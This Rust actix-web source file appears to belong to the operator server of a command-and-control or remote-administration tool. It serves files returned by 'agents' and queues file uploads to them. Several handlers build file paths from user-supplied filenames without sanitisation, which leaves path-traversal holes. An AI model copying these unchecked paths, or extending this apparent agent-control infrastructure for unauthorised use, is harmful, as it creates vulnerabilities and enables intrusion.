use crate::admin::command_formatter::CommandFormatter;
use crate::admin::models::{ApiResponse, UploadFile};
use crate::admin::routes::AppState;
use actix_web::http::header::{ContentDisposition, DispositionParam, DispositionType};
use actix_web::{
    get, post,
    web::{Data, Json, Path},
    HttpRequest, HttpResponse, Responder,
};
use base64::{engine::general_purpose::STANDARD, Engine as _};

#[get("/api/download_file/{filename}")]
pub async fn download_physical_file(
    filename: Path<String>,
    state: Data<AppState>,
    req: HttpRequest,
) -> impl Responder {
    if let Err(e) = state.jwt_manager.authenticate(&req, &state.database) {
        return HttpResponse::Unauthorized().json(ApiResponse {
            success: false,
            message: e.to_string(),
        });
    }

    let filename = filename.into_inner();
    let path = format!("agents_results/exe/{}", filename);

    match std::fs::read(&path) {
        Ok(bytes) => HttpResponse::Ok()
            .content_type("application/octet-stream")
            .insert_header(ContentDisposition {
                disposition: DispositionType::Attachment,
                parameters: vec![DispositionParam::Filename(filename.clone())],
            })
            .body(bytes),
        Err(_) => HttpResponse::NotFound().json(ApiResponse {
            success: false,
            message: format!("File '{}' not found", filename),
        }),
    }
}

#[get("/api/download/{result_id}")]
pub async fn download_result_file(
    state: Data<AppState>,
    result_id: Path<i64>,
    req: HttpRequest,
) -> impl Responder {
    if let Err(e) = state.jwt_manager.authenticate(&req, &state.database) {
        return HttpResponse::Unauthorized().json(ApiResponse {
            success: false,
            message: e.to_string(),
        });
    }

    let result_id_value = result_id.into_inner();

    let result = match state.database.get_result_by_id(result_id_value) {
        Ok(Some(r)) => r,
        Ok(None) => {
            return HttpResponse::NotFound().json(ApiResponse {
                success: false,
                message: format!("Result {} not found", result_id_value),
            });
        }
        Err(e) => {
            return HttpResponse::InternalServerError().json(ApiResponse {
                success: false,
                message: format!("Database error: {}", e),
            });
        }
    };

    let result_type = result.r#types.as_deref().unwrap_or("text");

    if result_type == "upload_file" {
        return HttpResponse::BadRequest().json(ApiResponse {
            success: false,
            message: format!("Result {} is an upload confirmation", result_id_value),
        });
    }

    if result_type != "file" {
        return HttpResponse::BadRequest().json(ApiResponse {
            success: false,
            message: format!(
                "Result {} is not a downloadable file (type: {})",
                result_id_value, result_type
            ),
        });
    }

    let filename = extract_filename(&state, &result, result_id_value);

    let file_data = match STANDARD.decode(&result.output) {
        Ok(data) => data,
        Err(e) => {
            log::error!(
                "Failed to decode file content for result {}: {}",
                result_id_value,
                e
            );
            return HttpResponse::InternalServerError().json(ApiResponse {
                success: false,
                message: format!("Failed to decode file content: {}", e),
            });
        }
    };

    let save_dir = "downloads";
    let save_path = format!("{}/{}", save_dir, filename);

    if let Err(e) = std::fs::create_dir_all(save_dir) {
        log::error!("Failed to create downloads directory: {}", e);
    } else if let Ok(()) = std::fs::write(&save_path, &file_data) {
        log::info!("File automatically saved to: {}", save_path);
        return HttpResponse::Ok()
            .content_type("application/octet-stream")
            .insert_header(("X-File-Saved-At", save_path.clone()))
            .insert_header(ContentDisposition {
                disposition: DispositionType::Inline,
                parameters: vec![DispositionParam::Filename(filename.clone())],
            })
            .body(file_data);
    }

    HttpResponse::Ok()
        .content_type("application/octet-stream")
        .insert_header(ContentDisposition {
            disposition: DispositionType::Attachment,
            parameters: vec![DispositionParam::Filename(filename)],
        })
        .body(file_data)
}

#[post("/api/upload")]
pub async fn upload_files(
    state: Data<AppState>,
    body: Json<UploadFile>,
    req: HttpRequest,
) -> impl Responder {
    let claims = match state.jwt_manager.authenticate(&req, &state.database) {
        Ok(c) => c,
        Err(e) => {
            return HttpResponse::Unauthorized().json(ApiResponse {
                success: false,
                message: e.to_string(),
            });
        }
    };

    log::info!(
        "[+] Upload request from user '{}' | agent={} | filename={} | size={}",
        claims.sub,
        body.agent_id,
        body.filename,
        body.content.len()
    );

    if state.agent_handler.get_agent(&body.agent_id).is_none() {
        log::warn!("[!] Agent {} not found", body.agent_id);
        return HttpResponse::NotFound().json(ApiResponse {
            success: false,
            message: format!("Agent {} not found", body.agent_id),
        });
    }

    let file_bytes = match STANDARD.decode(&body.content) {
        Ok(bytes) => bytes,
        Err(e) => {
            log::error!("[!] Invalid base64 content: {}", e);
            return HttpResponse::BadRequest().json(ApiResponse {
                success: false,
                message: format!("Invalid base64 content: {}", e),
            });
        }
    };

    let temp_dir = "temp_uploads";
    std::fs::create_dir_all(temp_dir).ok();
    let temp_path = format!("{}/{}", temp_dir, body.filename);

    if let Err(e) = std::fs::write(&temp_path, &file_bytes) {
        log::error!("[!] Failed to write temp file: {}", e);
        return HttpResponse::InternalServerError().json(ApiResponse {
            success: false,
            message: "Failed to process upload".to_string(),
        });
    }

    let upload_command = match CommandFormatter::format_command(&format!("/upload {}", temp_path)) {
        Ok(cmd) => {
            log::info!("[+] Upload command formatted: {}", cmd);
            cmd
        }
        Err(e) => {
            std::fs::remove_file(&temp_path).ok();
            log::error!("[!] Failed to format upload command: {}", e);
            return HttpResponse::BadRequest().json(ApiResponse {
                success: false,
                message: format!("Failed to format command: {}", e),
            });
        }
    };

    std::fs::remove_file(&temp_path).ok();

    let command_id = match state.database.add_command(&body.agent_id, &upload_command) {
        Ok(id) => {
            log::info!(
                "[+] Upload command {} created for agent {}",
                id,
                body.agent_id
            );
            id
        }
        Err(e) => {
            log::error!("[!] Failed to create upload command: {}", e);
            return HttpResponse::InternalServerError().json(ApiResponse {
                success: false,
                message: format!("Failed to create upload command: {}", e),
            });
        }
    };

    if let Err(e) = state.database.log_agent_action(
        &body.agent_id,
        "upload_queued",
        Some(&format!(
            "file: {} ({} bytes)",
            body.filename,
            file_bytes.len()
        )),
        Some(&claims.sub),
    ) {
        log::warn!("[!] Failed to log upload action: {}", e);
    }

    log::info!(
        "[+] Upload queued successfully | agent={} | command_id={} | file={}",
        body.agent_id,
        command_id,
        body.filename
    );

    HttpResponse::Ok().json(serde_json::json!({
        "success": true,
        "message": format!("Upload queued for agent {}", body.agent_id),
        "command_id": command_id,
        "filename": body.filename,
        "size": file_bytes.len(),
    }))
}

#[get("/api/view/{result_id}")]
pub async fn view_result_file(
    state: Data<AppState>,
    result_id: Path<i64>,
    req: HttpRequest,
) -> impl Responder {
    if let Err(e) = state.jwt_manager.authenticate(&req, &state.database) {
        return HttpResponse::Unauthorized().json(ApiResponse {
            success: false,
            message: e.to_string(),
        });
    }

    let result_id_value = result_id.into_inner();

    let result = match state.database.get_result_by_id(result_id_value) {
        Ok(Some(r)) => r,
        Ok(None) => {
            return HttpResponse::NotFound().json(ApiResponse {
                success: false,
                message: format!("Result {} not found", result_id_value),
            });
        }
        Err(e) => {
            return HttpResponse::InternalServerError().json(ApiResponse {
                success: false,
                message: format!("Database error: {}", e),
            });
        }
    };

    if result.r#types.as_deref() != Some("file") {
        return HttpResponse::BadRequest().json(ApiResponse {
            success: false,
            message: format!("Result {} is not a file", result_id_value),
        });
    }

    let file_data = match STANDARD.decode(&result.output) {
        Ok(data) => data,
        Err(e) => {
            log::error!("[!] Failed to decode file content: {}", e);
            return HttpResponse::InternalServerError().json(ApiResponse {
                success: false,
                message: format!("Failed to decode file: {}", e),
            });
        }
    };

    match String::from_utf8(file_data.clone()) {
        Ok(content) => HttpResponse::Ok().json(serde_json::json!({
            "result_id": result_id_value,
            "filename": result.filename,
            "size": file_data.len(),
            "type": "text",
            "content": content
        })),
        Err(_) => HttpResponse::Ok().json(serde_json::json!({
            "result_id": result_id_value,
            "filename": result.filename,
            "size": file_data.len(),
            "type": "binary",
            "message": "Binary file - use /api/download to get the file"
        })),
    }
}

fn extract_filename(
    state: &Data<AppState>,
    result: &crate::admin::models::ResultDetail,
    result_id: i64,
) -> String {
    if let Some(db_filename) = &result.filename {
        if !db_filename.is_empty() {
            return db_filename.clone();
        }
    }

    if let Some(cmd_id) = result.command_id {
        if let Some(fname) = state.database.extract_filename_from_command_id(cmd_id) {
            return fname;
        }
    }

    format!("download_{}.bin", result_id)
}
